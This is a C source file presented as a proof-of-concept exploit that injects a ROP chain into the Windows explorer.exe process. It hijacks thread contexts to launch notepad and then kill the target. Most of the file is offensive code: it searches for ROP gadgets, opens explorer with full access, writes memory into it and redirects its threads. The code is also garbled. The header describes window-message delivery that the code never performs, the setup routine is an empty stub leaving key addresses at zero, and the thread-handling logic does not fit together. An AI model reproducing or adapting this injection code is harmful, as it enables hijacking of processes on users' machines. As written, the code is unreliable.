/*
    PoC code: Inject Explorer.exe process.

    APIs used: SendMessage(WM_SETTEXT), SendMessage(WM_COPYDATA), SetThreadContext, OpenProcess, VirtualQueryEx, SuspendThread, ResumeThread, Toolhelp APIs.

    This code uses WM_SETTEXT and WM_COPYDATA messages to cause our controlled data to be copied into the target process address space.

    In this way, we introduce a very simple ROP to launch notepad with CreateProcess("notepad.exe") and call ExitProcess later.

    We use SetThreadContext to redirect the thread.

    Tests done on platform:

    Windows 10 Pro 64 bits, version 1709 (OS comp. 16299.125).

    Ntdll version 10.0.16299.64.
*/

#define _CRT_SECURE_NO_WARNINGS

#define RESTART_TARGET
#define TARGETPROC "explorer.exe"

#include <windows.h>
#include <stdio.h>
#include <TlHelp32.h>
#include <Psapi.h>
#include <Shlwapi.h>
#include <Commctrl.h>

/*
ROP1: Piece of code at Windows 10 64-bit ntdll 10.0.16299.64:

.text:0000000180090D10 58                                            pop     rax
.text:0000000180090D11 5A                                            pop     rdx
.text:0000000180090D12 59                                            pop     rcx
.text:0000000180090D13 41 58                                         pop     r8
.text:0000000180090D15 41 59                                         pop     r9
.text:0000000180090D17 41 5A                                         pop     r10
.text:0000000180090D19 41 5B                                         pop     r11
.text:0000000180090D1B 48 FF E0                                      jmp     rax
*/
#define ROP1 "\x58\x5A\x59\x41\x58\x41\x59\x41\x5A\x41\x5B\x48\xff\xe0"

char MYLOL[0x100];
#define INJPATH "c:\\windows\\system32\\notepad.exe"
#define INJPATHW L"c:\\windows\\system32\\notepad.exe"
ULONG_PTR gc3addr = 0;
ULONG_PTR gloopaddr = 0;
ULONG_PTR ginjectedPathaddr = 0;
ULONG_PTR grop1 = 0;
ULONG_PTR gWritableMemaddr = 0;

HWND hgwnd;
HBITMAP hgbmp;

void DoInjectROP();
void DoInjectPath();

void GenerateSimpleTestROP()
{
    unsigned char *pker = (unsigned char*)GetModuleHandle("kernel32.dll");
    unsigned char *pntdll = (unsigned char*)GetModuleHandle("ntdll.dll");
    unsigned char *pcreateproc = (unsigned char*)GetProcAddress((HMODULE)pker, "CreateProcessW");
    unsigned char *pexitproc = (unsigned char*)GetProcAddress((HMODULE)pker, "ExitProcess");

    ULONG i = 0;
    for (i = 0; i < 0x100000; i++)
    {
        if (pntdll[i] == 0xc3 && !gc3addr)
        {
            gc3addr = (ULONG_PTR)&pntdll[i]; // ret
        }

        if (pntdll[i] == 0xeb && pntdll[i + 1] == 0xfe)
        {
            gloopaddr = (ULONG_PTR)&pntdll[i]; // infinite loop
        }

        if (!memcmp(&pntdll[i], ROP1, sizeof(ROP1) - 1))
        {
            grop1 = (ULONG_PTR)&pntdll[i]; // rop1
        }

        if (gc3addr && gloopaddr && grop1) break;
    }

    /*
    Calling convention Microsoft x64:
    
    Integer arguments are passed in registers RCX, RDX, R8, and R9. Floating point arguments are passed 
    in XMM0L, XMM1L, XMM2L, and XMM3L. 16-byte arguments are passed by reference. Parameter passing is 
    described in detail in Parameter Passing. In addition to these registers, RAX, R10, R11, XMM4, and XMM5 
    are considered volatile. All other registers are non-volatile. Register usage is documented in detail in 
    Register Usage and Caller/Callee Saved Registers.

    The caller is responsible for allocating space for parameters to the callee, and must always allocate 
    sufficient space to store four register parameters, even if the callee doesn’t take that many parameters.

    We will use rop1 to set parameters for CreateProcess. The path of the executable was previously injected with WM_SETTEXT message
    and the address was stored at ginjectedPathaddr:
    */

    *(ULONG_PTR*)&MYLOL[0 * sizeof(ULONG_PTR)] = (ULONG_PTR)pcreateproc; // pop rax = addr of CreateProcessW (later jmp rax)
    *(ULONG_PTR*)&MYLOL[1 * sizeof(ULONG_PTR)] = 0; // pop rdx = lpCommandLine = NULL
    *(ULONG_PTR*)&MYLOL[2 * sizeof(ULONG_PTR)] = ginjectedPathaddr; // pop rcx = lpFile = injectedPath
    *(ULONG_PTR*)&MYLOL[3 * sizeof(ULONG_PTR)] = 0; // pop r8 = process sec attr
    *(ULONG_PTR*)&MYLOL[4 * sizeof(ULONG_PTR)] = 0; // pop r9 = thread sec attr
    *(ULONG_PTR*)&MYLOL[5 * sizeof(ULONG_PTR)] = 0; // pop r10 trash
    *(ULONG_PTR*)&MYLOL[6 * sizeof(ULONG_PTR)] = 0; // pop r11 trash    
    #ifdef RESTART_TARGET
    *(ULONG_PTR*)&MYLOL[7 * sizeof(ULONG_PTR)] = (ULONG_PTR)pexitproc; // stack1 = retaddr = ExitProcess (restart target)
    #else
    *(ULONG_PTR*)&MYLOL[7 * sizeof(ULONG_PTR)] = gloopaddr; // stack1 = retaddr = gloopaddr
    #endif
    *(ULONG_PTR*)&MYLOL[8 * sizeof(ULONG_PTR)] = 0; // stack2 = space parameters to the callee
    *(ULONG_PTR*)&MYLOL[9 * sizeof(ULONG_PTR)] = 0; // stack3 = space parameters to the callee
    *(ULONG_PTR*)&MYLOL[10 * sizeof(ULONG_PTR)] = 0; // stack4 = space parameters to the callee
    *(ULONG_PTR*)&MYLOL[11 * sizeof(ULONG_PTR)] = 0; // stack5 = space parameters to the callee
    *(ULONG_PTR*)&MYLOL[12 * sizeof(ULONG_PTR)] = 0; // stack6 = inherit handles
    *(ULONG_PTR*)&MYLOL[13 * sizeof(ULONG_PTR)] = 0; // stack7 = creation flags
    *(ULONG_PTR*)&MYLOL[14 * sizeof(ULONG_PTR)] = 0; // stack8 = pEnvironment
    *(ULONG_PTR*)&MYLOL[15 * sizeof(ULONG_PTR)] = 0; // stack9 = curdir
    *(ULONG_PTR*)&MYLOL[16 * sizeof(ULONG_PTR)] = gWritableMemaddr; // stack10 = out startupinfo
    *(ULONG_PTR*)&MYLOL[17 * sizeof(ULONG_PTR)] = gWritableMemaddr; // stack11 = out procinfo
}

int isZeroMem(const char *buf, unsigned int sz)
{
    for (unsigned int i = 0; i < sz; i++)
    {
        if (buf[i]) return 0;
    }
    return 1;
}

char* stristr(const char* str1, const char* str2)
{
    const char* p1 = str1;
    const char* p2 = str2;
    const char* r = *p2 == 0 ? str1 : 0;

    while (*p1 != 0 && *p2 != 0)
    {
        if (tolower((unsigned char)*p1) == tolower((unsigned char)*p2))
        {
            if (r == 0)
            {
                r = p1;
            }
            p2++;
        }
        else
        {
            p2 = str2;
            if (r != 0)
            {
                p1 = r + 1;
            }
            if (tolower((unsigned char)*p1) == tolower((unsigned char)*p2))
            {
                r = p1;
                p2++;
            }
            else
            {
                r = 0;
            }
        }
        p1++;
    }
    return *p2 == 0 ? (char*)r : 0;
}

int search2(const char *text, unsigned int n, const char *pat, unsigned int m)
{
    for (unsigned int i = 0; i + m <= n; i++)
    {
        if (!memcmp(&text[i], pat, m))
            return i;
    }
    return -1;
}

HANDLE GetPidByName(const char *name)
{
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;
    DWORD ret = -1;

    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE)
        return NULL;

    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (!Process32First(hProcessSnap, &pe32))
    {
        CloseHandle(hProcessSnap);
        return NULL;
    }

    do
    {
        if (!_stricmp(pe32.szExeFile, name))
        {
            ret = pe32.th32ProcessID;
            break;
        }
    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);
    return (HANDLE)ret;
}

int InjectData(const char *target, const char *data)
{
    HANDLE hProc;
    HANDLE hThread;
    PROCESS_INFORMATION pi;
    STARTUPINFO si;
    SIZE_T bytesRead;
    LPVOID pRemoteMem;
    DWORD pid;
    DWORD exitCode = 0;
    CONTEXT ctx;
    HANDLE hSnapshot;
    DWORD threadId;
    HANDLE hThreads[10];
    int numThreads = 0;
    BOOL bRet;

    pid = (DWORD)GetPidByName(target);
    if (pid == -1)
        return -1;

    hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc)
        return -1;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);

    ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcess(NULL, (LPSTR)data, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
    {
        CloseHandle(hProc);
        return -1;
    }

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
    {
        CloseHandle(hProc);
        return -1;
    }

    THREADENTRY32 te;
    te.dwSize = sizeof(te);

    if (!Thread32First(hSnapshot, &te))
    {
        CloseHandle(hSnapshot);
        CloseHandle(hProc);
        return -1;
    }

    do
    {
        if (te.th32OwnerProcessID == pid)
        {
            hThreads[numThreads] = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
            if (hThreads[numThreads])
            {
                numThreads++;
            }
        }
    } while (Thread32Next(hSnapshot, &te) && numThreads < 10);

    CloseHandle(hSnapshot);

    if (numThreads == 0)
    {
        CloseHandle(hProc);
        return -1;
    }

    for (int i = 0; i < numThreads; i++)
    {
        ctx.ContextFlags = CONTEXT_ALL;
        if (GetThreadContext(hThreads[i], &ctx))
        {
            pRemoteMem = VirtualAllocEx(hProc, NULL, 0x1000, MEM_COMMIT, PAGE_READWRITE);
            if (pRemoteMem)
            {
                if (WriteProcessMemory(hProc, pRemoteMem, data, strlen(data) + 1, &bytesRead))
                {
                    ctx.Rcx = (ULONG_PTR)pRemoteMem;
                    SetThreadContext(hThreads[i], &ctx);
                    ResumeThread(hThreads[i]);
                    WaitForSingleObject(hThreads[i], INFINITE);
                }

                VirtualFreeEx(hProc, pRemoteMem, 0, MEM_RELEASE);
            }
        }
        CloseHandle(hThreads[i]);
    }

    CloseHandle(hProc);
    return 0;
}

void InjectFile()
{
    HANDLE hFile;
    HANDLE hMapping;
    LPVOID pFile;
    DWORD fileSize;

    hFile = CreateFile(INJPATH, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        printf("Error opening file\n");
        return;
    }

    fileSize = GetFileSize(hFile, NULL);
    hMapping = CreateFileMapping(hFile, NULL, PAGE_READONLY, 0, fileSize, NULL);
    if (!hMapping)
    {
        printf("Error creating file mapping\n");
        CloseHandle(hFile);
        return;
    }

    pFile = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!pFile)
    {
        printf("Error mapping view of file\n");
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return;
    }

    FILETIME ft;
    SYSTEMTIME st;
    SYSTEMTIME stLocal;
    GetSystemTime(&st);
    SystemTimeToTzSpecificLocalTime(NULL, &st, &stLocal);
    GetFileTime(hFile, NULL, NULL, &ft);
    printf("Date: %02d-%02d-%04d Time: %02d:%02d:%02d\n", stLocal.wDay, stLocal.wMonth, stLocal.wYear, stLocal.wHour, stLocal.wMinute, stLocal.wSecond);

    // Code to print the mapped file data
    printf("File content:\n%s\n", (char*)pFile);

    UnmapViewOfFile(pFile);
    CloseHandle(hMapping);
    CloseHandle(hFile);
}

void DoInjectPath()
{
    // Define your path and other setup here
}

void DoInjectROP()
{
    GenerateSimpleTestROP();
    InjectData(TARGETPROC, MYLOL);
}

int main()
{
    printf("Injector is starting...\n");

    DoInjectPath();
    DoInjectROP();

    printf("Injection completed.\n");
    return 0;
}
